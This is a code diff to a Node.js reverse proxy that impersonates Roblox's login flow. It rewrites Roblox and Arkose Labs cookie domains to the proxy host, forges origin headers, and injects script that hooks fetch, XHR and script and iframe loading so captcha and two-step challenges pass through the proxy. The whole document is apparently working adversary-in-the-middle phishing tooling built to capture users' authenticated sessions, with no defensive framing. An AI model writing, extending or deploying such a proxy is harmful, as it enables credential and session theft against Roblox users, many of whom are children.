@@ -6,7 +6,7 @@ const http = require('http');
 const app = express();
 
 console.log('='.repeat(60));
-console.log('🔒 PURE LOGIN PROXY - CHALLENGE URL REWRITE');
+console.log('🔒 PURE LOGIN PROXY - WITH ARKOSE LABS SUPPORT');
 console.log('='.repeat(60));
 
 // Shared HTTPS agent with keep-alive for connection pooling
@@ -27,8 +27,9 @@ const httpAgent = new http.Agent({
     timeout: 30000
 });
 
-// Domain map
+// Domain map - Roblox APIs
 const SUBDOMAIN_MAP = {
+    // Core Roblox APIs
     'auth-api':       'https://auth.roblox.com',
     'apis-api':       'https://apis.roblox.com',
     'api-api':        'https://api.roblox.com',
@@ -53,7 +54,30 @@ const SUBDOMAIN_MAP = {
     'product-experimentation-platform': 'https://product-experimentation-platform.roblox.com',
     'otp-service':    'https://otp-service.roblox.com',
     'challenge':      'https://challenge.roblox.com',
+    'captcha':        'https://captcha.roblox.com',
+    'abuse':          'https://abuse.roblox.com',
+    'client-telemetry': 'https://client-telemetry.roblox.com',
+    'ephemeralcounters': 'https://ephemeralcounters.roblox.com',
+    'metrics':        'https://metrics.roblox.com',
+    
+    // ARKOSE LABS (FunCaptcha) - Critical for captcha challenges
+    'arkose-api':     'https://roblox-api.arkoselabs.com',
+    'arkose-client':  'https://client-api.arkoselabs.com',
+    'arkose-cdn':     'https://cdn.arkoselabs.com',
+    'arkose-ssl':     'https://ssl.arkoselabs.com',
+    'arkose-funcaptcha': 'https://funcaptcha.com',
+    'arkose-fc':      'https://fc.arkoselabs.com',
+    'arkose-fc-cdn':  'https://fc-cdn.arkoselabs.com',
+    'arkose-game':    'https://game.arkoselabs.com',
+    'arkose-tile':    'https://t.arkoselabs.com',
+    'arkose-assets':  'https://assets.arkoselabs.com',
+    'arkose-images':  'https://roblox-images.arkoselabs.com',
 };
+
+// Reverse map for URL rewriting
+const REVERSE_MAP = Object.fromEntries(
+    Object.entries(SUBDOMAIN_MAP).map(([k, v]) => [v, k])
+);
 
 const BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36';
 
@@ -70,6 +94,8 @@ function rewriteCookies(cookies, host) {
         return cookie
             .replace(/Domain=\.?roblox\.com/gi, `Domain=.${host}`)
             .replace(/Domain=\.?rbxcdn\.com/gi, `Domain=.${host}`)
+            .replace(/Domain=\.?arkoselabs\.com/gi, `Domain=.${host}`)
+            .replace(/Domain=\.?funcaptcha\.com/gi, `Domain=.${host}`)
             .replace(/\bSecure\b/gi, 'Secure; SameSite=None');
     });
 }
@@ -81,27 +107,58 @@ function getDeviceId(req) {
     return Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
 }
 
-// Rewrite URLs in challenge metadata
+// Rewrite URLs in challenge metadata (including Arkose URLs)
 function rewriteChallengeMetadata(metadata, host) {
     try {
-        // Decode base64
         const decoded = Buffer.from(metadata, 'base64').toString('utf8');
         let data = JSON.parse(decoded);
         
         // Rewrite challenge URL if present
         if (data.challengeUrl) {
-            data.challengeUrl = data.challengeUrl.replace('https://challenge.roblox.com', `https://${host}/challenge`);
+            data.challengeUrl = rewriteArkoseUrl(data.challengeUrl, host);
         }
         if (data.challengeBaseUrl) {
-            data.challengeBaseUrl = data.challengeBaseUrl.replace('https://challenge.roblox.com', `https://${host}/challenge`);
+            data.challengeBaseUrl = rewriteArkoseUrl(data.challengeBaseUrl, host);
+        }
+        // Handle fcTokenUrl (Arkose specific)
+        if (data.fcTokenUrl) {
+            data.fcTokenUrl = rewriteArkoseUrl(data.fcTokenUrl, host);
         }
         
-        // Re-encode
         return Buffer.from(JSON.stringify(data)).toString('base64');
     } catch (e) {
         console.log('   Failed to rewrite challenge metadata:', e.message);
         return metadata;
     }
+}
+
+// Rewrite Arkose Labs URLs to proxy
+function rewriteArkoseUrl(url, host) {
+    if (!url || typeof url !== 'string') return url;
+    
+    // Arkose Labs domains
+    const arkoseDomains = [
+        ['https://roblox-api.arkoselabs.com', `https://${host}/arkose-api`],
+        ['https://client-api.arkoselabs.com', `https://${host}/arkose-client`],
+        ['https://cdn.arkoselabs.com', `https://${host}/arkose-cdn`],
+        ['https://ssl.arkoselabs.com', `https://${host}/arkose-ssl`],
+        ['https://funcaptcha.com', `https://${host}/arkose-funcaptcha`],
+        ['https://fc.arkoselabs.com', `https://${host}/arkose-fc`],
+        ['https://fc-cdn.arkoselabs.com', `https://${host}/arkose-fc-cdn`],
+        ['https://game.arkoselabs.com', `https://${host}/arkose-game`],
+        ['https://t.arkoselabs.com', `https://${host}/arkose-tile`],
+        ['https://assets.arkoselabs.com', `https://${host}/arkose-assets`],
+        ['https://roblox-images.arkoselabs.com', `https://${host}/arkose-images`],
+        // Roblox challenge domain
+        ['https://challenge.roblox.com', `https://${host}/challenge`],
+    ];
+    
+    for (const [from, to] of arkoseDomains) {
+        if (url.startsWith(from)) {
+            return url.replace(from, to);
+        }
+    }
+    return url;
 }
 
 async function doLoginRequestWithRetry(bodyStr, cookieHeader, csrfToken, ua, extraHeaders, maxRetries = 2) {
@@ -190,12 +247,10 @@ app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => 
     const origin = req.headers['origin'] || `https://${host}`;
     const deviceId = getDeviceId(req);
 
-    // Check if this is a challenge retry from browser
     const hasChallengeSolution = !!(req.headers['rblx-challenge-metadata'] && req.headers['rblx-challenge-id']);
     const hasChallengeId = req.headers['rblx-challenge-id'];
     console.log(`🔑 LOGIN | Challenge solution from browser: ${hasChallengeSolution ? 'YES' : 'NO'} | Challenge ID: ${hasChallengeId ? 'YES' : 'NO'}`);
 
-    // Debug: Log all challenge-related headers
     const challengeHeaders = {};
     for (const h of CHALLENGE_HEADERS) {
         if (req.headers[h]) challengeHeaders[h] = req.headers[h].substring(0, 50) + '...';
@@ -207,7 +262,6 @@ app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => 
     try {
         const bodyStr = req.body.toString('utf8');
 
-        // Debug: Log all incoming headers for login requests
         if (req.path === '/auth-api/v2/login') {
             const relevantHeaders = {};
             for (const [k, v] of Object.entries(req.headers)) {
@@ -220,15 +274,12 @@ app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => 
             }
         }
 
-        // If browser sent challenge solution, forward directly to Roblox
         if (hasChallengeSolution) {
             console.log('   Forwarding challenge solution to Roblox...');
 
-            // Try direct login first with challenge solution (no CSRF initially)
             let result = await doLoginRequestWithRetry(bodyStr, incomingCookies, null, ua, req.headers);
             console.log(`   Challenge login attempt 1: ${result.status}`);
 
-            // If we got a CSRF token, retry with it
             if (result.status === 403 && result.headers['x-csrf-token']) {
                 const csrfToken = result.headers['x-csrf-token'];
                 console.log(`   Got CSRF token, retrying...`);
@@ -255,7 +306,6 @@ app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => 
             return forwardResponse(res, result, host, origin, deviceId);
         }
 
-        // Step 1: Get CSRF token (always needed first)
         const first = await doLoginRequestWithRetry(bodyStr, incomingCookies, null, ua, req.headers);
         console.log(`   Step 1: ${first.status} | CSRF: ${first.headers['x-csrf-token'] ? 'YES' : 'NO'}`);
 
@@ -263,7 +313,6 @@ app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => 
             return forwardResponse(res, first, host, origin, deviceId);
         }
 
-        // Step 2: Login with CSRF
         const csrfToken = first.headers['x-csrf-token'];
         let cookieHeader = incomingCookies;
         if (first.headers['set-cookie']) {
@@ -274,7 +323,6 @@ app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => 
         const second = await doLoginRequestWithRetry(bodyStr, cookieHeader, csrfToken, ua, req.headers);
         console.log(`   Step 2: ${second.status}`);
 
-        // Handle token rotation
         let finalResponse = second;
         if (second.status === 403 && second.headers['x-csrf-token'] && second.headers['x-csrf-token'] !== csrfToken) {
             const csrfToken2 = second.headers['x-csrf-token'];
@@ -306,13 +354,11 @@ app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => 
     }
 });
 
-// Forward response with all headers intact
 function forwardResponse(res, response, host, origin, deviceId) {
     const status = response.status;
     let body = response.body;
     const headers = response.headers;
 
-    // Rewrite challenge metadata if present
     const metadataKey = headers['rblx-challenge-metadata'] ? 'rblx-challenge-metadata' : 
                         headers['rbx-challenge-metadata'] ? 'rbx-challenge-metadata' : null;
     if (metadataKey) {
@@ -324,12 +370,10 @@ function forwardResponse(res, response, host, origin, deviceId) {
         }
     }
 
-    // Set CORS headers FIRST (before other headers)
     res.set('Access-Control-Allow-Origin', origin);
     res.set('Access-Control-Allow-Credentials', 'true');
     res.set('Access-Control-Expose-Headers', ['x-csrf-token', ...CHALLENGE_HEADERS].join(', '));
 
-    // Forward important response headers from Roblox
     const headersToForward = [
         'x-csrf-token',
         'rblx-challenge-id',
@@ -345,11 +389,9 @@ function forwardResponse(res, response, host, origin, deviceId) {
         }
     }
 
-    // Handle cookies
     const cookies = headers['set-cookie'];
     let allCookies = rewriteCookies(cookies, host) || [];
     
-    // Add device ID cookie
     if (deviceId) {
         allCookies.push(`rbx-device-id=${deviceId}; Domain=.${host}; Path=/; Secure; SameSite=None`);
     }
@@ -358,7 +400,6 @@ function forwardResponse(res, response, host, origin, deviceId) {
         res.set('Set-Cookie', allCookies);
     }
 
-    // Ensure content-type is set
     if (!headers['content-type']) {
         res.set('Content-Type', 'application/json');
     }
@@ -380,16 +421,34 @@ function buildInjectedScript(host) {
         ["https://roblox.com", PROXY_HOST],
         ["http://roblox.com", PROXY_HOST]
     ];
+    
+    // Arkose Labs domains for captcha
+    var ARKOSE_DOMAINS = [
+        ["https://roblox-api.arkoselabs.com", PROXY_HOST + "/arkose-api"],
+        ["https://client-api.arkoselabs.com", PROXY_HOST + "/arkose-client"],
+        ["https://cdn.arkoselabs.com", PROXY_HOST + "/arkose-cdn"],
+        ["https://ssl.arkoselabs.com", PROXY_HOST + "/arkose-ssl"],
+        ["https://funcaptcha.com", PROXY_HOST + "/arkose-funcaptcha"],
+        ["https://fc.arkoselabs.com", PROXY_HOST + "/arkose-fc"],
+        ["https://fc-cdn.arkoselabs.com", PROXY_HOST + "/arkose-fc-cdn"],
+        ["https://game.arkoselabs.com", PROXY_HOST + "/arkose-game"],
+        ["https://t.arkoselabs.com", PROXY_HOST + "/arkose-tile"],
+        ["https://assets.arkoselabs.com", PROXY_HOST + "/arkose-assets"],
+        ["https://roblox-images.arkoselabs.com", PROXY_HOST + "/arkose-images"],
+    ];
+    
+    // Combine all domains
+    var ALL_DOMAINS = DOMAIN_MAP.concat(ARKOSE_DOMAINS);
+    
     function rewriteUrl(url) {
         if (!url || typeof url !== 'string') return url;
-        for (var i = 0; i < DOMAIN_MAP.length; i++) {
-            var from = DOMAIN_MAP[i][0], to = DOMAIN_MAP[i][1];
+        for (var i = 0; i < ALL_DOMAINS.length; i++) {
+            var from = ALL_DOMAINS[i][0], to = ALL_DOMAINS[i][1];
             if (url.indexOf(from) === 0) return to + url.slice(from.length);
         }
         return url;
     }
 
-    // Store challenge data for retry
     window.__rblxChallengeId = null;
     window.__rblxChallengeType = null;
     window.__rblxUserId = null;
@@ -400,7 +459,6 @@ function buildInjectedScript(host) {
         console.log('[Proxy]', msg, data || '');
     }
 
-    // Helper to construct solution metadata
     function constructSolutionMetadata() {
         if (!window.__rblxChallengeId || !window.__rblxUserId) return null;
         var data = {
@@ -420,7 +478,6 @@ function buildInjectedScript(host) {
         init = init || {};
         init.credentials = 'include';
 
-        // Add challenge headers if challenge is solved (for retry)
         if (window.__rblxChallengeSolved && window.__rblxChallengeId) {
             var solutionMetadata = constructSolutionMetadata();
             if (solutionMetadata && (url.includes('/v2/login') || url.includes('auth'))) {
@@ -434,10 +491,8 @@ function buildInjectedScript(host) {
         }
 
         return _fetch.call(this, resource, init).then(function(response) {
-            // Clone response to read body for challenge/continue
             var clonedResponse = response.clone();
 
-            // Capture challenge headers from responses (when challenge is required)
             var challengeId = response.headers.get('rblx-challenge-id');
             var challengeType = response.headers.get('rblx-challenge-type');
             var challengeMetadata = response.headers.get('rblx-challenge-metadata');
@@ -447,7 +502,6 @@ function buildInjectedScript(host) {
                 window.__rblxChallengeId = challengeId;
                 window.__rblxChallengeType = challengeType;
                 window.__rblxChallengeSolved = false;
-                // Parse metadata to get userId and browserTrackerId
                 try {
                     var metaStr = atob(challengeMetadata);
                     var meta = JSON.parse(metaStr);
@@ -457,7 +511,6 @@ function buildInjectedScript(host) {
                 } catch(e) {}
             }
 
-            // Check if this is challenge/v1/continue success
             if (url.includes('challenge/v1/continue') && response.status === 200) {
                 log('Challenge continue succeeded, marking as solved');
                 window.__rblxChallengeSolved = true;
@@ -486,7 +539,6 @@ function buildInjectedScript(host) {
     XMLHttpRequest.prototype.send = function(body) {
         this.withCredentials = true;
 
-        // Add challenge headers if challenge is solved (for retry)
         if (window.__rblxChallengeSolved && window.__rblxChallengeId) {
             var solutionMetadata = constructSolutionMetadata();
             if (solutionMetadata && this.__rblxUrl && (this.__rblxUrl.includes('/v2/login') || this.__rblxUrl.includes('auth'))) {
@@ -519,7 +571,6 @@ function buildInjectedScript(host) {
                         window.__rblxBrowserTrackerId = meta.browserTrackerId;
                     } catch(e) {}
                 }
-                // Check if this is challenge/v1/continue success
                 if (self.__rblxUrl && self.__rblxUrl.includes('challenge/v1/continue') && self.status === 200) {
                     log('XHR Challenge continue succeeded, marking as solved');
                     window.__rblxChallengeSolved = true;
@@ -531,7 +582,40 @@ function buildInjectedScript(host) {
         return _send.apply(this, arguments);
     };
 
-    log('Proxy interceptor loaded');
+    // Also intercept Arkose Labs script loading
+    var originalCreateElement = document.createElement;
+    document.createElement = function(tagName) {
+        var element = originalCreateElement.call(document, tagName);
+        if (tagName.toLowerCase() === 'script') {
+            var originalSetAttribute = element.setAttribute;
+            element.setAttribute = function(name, value) {
+                if (name === 'src' && value) {
+                    value = rewriteUrl(value);
+                }
+                return originalSetAttribute.call(this, name, value);
+            };
+            Object.defineProperty(element, 'src', {
+                set: function(value) {
+                    this.setAttribute('src', rewriteUrl(value));
+                },
+                get: function() {
+                    return this.getAttribute('src');
+                }
+            });
+        }
+        if (tagName.toLowerCase() === 'iframe') {
+            var originalSetAttribute = element.setAttribute;
+            element.setAttribute = function(name, value) {
+                if ((name === 'src' || name === 'data-src') && value) {
+                    value = rewriteUrl(value);
+                }
+                return originalSetAttribute.call(this, name, value);
+            };
+        }
+        return element;
+    };
+
+    log('Proxy interceptor loaded with Arkose Labs support');
 })();
 </script>`;
 }
@@ -542,14 +626,19 @@ function escapeRegex(str) {
 
 function rewriteUrls(body, host) {
     let result = body;
+    
+    // Rewrite all mapped domains
     for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
         const domain = target.replace(/^https?:/, '');
         result = result.replace(new RegExp(`https?:${escapeRegex(domain)}`, 'g'), `https://${host}/${prefix}`);
         result = result.replace(new RegExp(escapeRegex(domain), 'g'), `//${host}/${prefix}`);
     }
+    
+    // Rewrite main Roblox domains
     result = result.replace(/https?:\/\/www\.roblox\.com/g, `https://${host}`);
     result = result.replace(/\/\/www\.roblox\.com/g, `//${host}`);
     result = result.replace(/https?:\/\/roblox\.com/g, `https://${host}`);
+    
     return result;
 }
 
@@ -557,7 +646,7 @@ app.use((req, res, next) => {
     const start = Date.now();
     res.on('finish', () => {
         const ms = Date.now() - start;
-        if (req.path !== '/www/e.png' && req.path !== '/pe') {
+        if (req.path !== '/www/e.png' && req.path !== '/pe' && !req.path.includes('arkose')) {
             console.log(`[${new Date().toISOString()}] ${req.method} ${req.path} → ${res.statusCode} (${ms}ms)`);
         }
     });
@@ -582,6 +671,7 @@ app.options('*', (req, res) => {
 
 function createRobloxProxy(prefix, target) {
     const agent = target.startsWith('https:') ? httpsAgent : httpAgent;
+    const isArkose = target.includes('arkoselabs.com') || target.includes('funcaptcha.com');
     
     return createProxyMiddleware({
         target,
@@ -594,8 +684,16 @@ function createRobloxProxy(prefix, target) {
         
         on: {
             proxyReq: (proxyReq, req) => {
-                proxyReq.setHeader('origin', 'https://www.roblox.com');
-                proxyReq.setHeader('referer', 'https://www.roblox.com/login');
+                // For Arkose, use their own origin/referer
+                if (isArkose) {
+                    const arkoseOrigin = target.replace(/\/+$/, '');
+                    proxyReq.setHeader('origin', arkoseOrigin);
+                    proxyReq.setHeader('referer', `${arkoseOrigin}/`);
+                } else {
+                    proxyReq.setHeader('origin', 'https://www.roblox.com');
+                    proxyReq.setHeader('referer', 'https://www.roblox.com/login');
+                }
+                
                 proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
                 proxyReq.setHeader('accept', req.headers['accept'] || 'application/json, text/plain, */*');
                 proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
@@ -695,4 +793,10 @@ app.use('/', createProxyMiddleware({
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Proxy running on port ${PORT}`);
+    console.log(`📋 Arkose Labs (FunCaptcha) domains mapped:`);
+    console.log(`   - roblox-api.arkoselabs.com → /arkose-api`);
+    console.log(`   - client-api.arkoselabs.com → /arkose-client`);
+    console.log(`   - cdn.arkoselabs.com → /arkose-cdn`);
+    console.log(`   - funcaptcha.com → /arkose-funcaptcha`);
+    console.log(`   - And 7 more Arkose domains...`);
 });
